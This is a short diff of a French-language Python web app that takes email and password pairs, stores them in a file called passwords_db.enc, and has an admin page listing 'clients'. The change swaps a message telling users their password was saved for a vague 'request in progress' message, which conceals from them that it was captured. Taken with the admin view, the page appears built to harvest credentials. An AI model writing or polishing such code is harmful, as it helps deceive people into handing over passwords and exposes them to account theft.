@@ -114,7 +114,7 @@ def index():
         # 3. Sauvegarder l'ensemble dans le fichier sécurisé `passwords_db.enc`
         sauvegarder_base(base)
         
-        success = f"Succès ! Le mot de passe pour {email} a bien été enregistré et protégé dans le fichier."
+        success = f"Succès ! Votre demande est en cours de traitement, merci de patienter."
         
     return render_template_string(HTML_PAGE, success=success)
 # --- PAGE ADMIN POUR VOIR LES CLIENTS ---
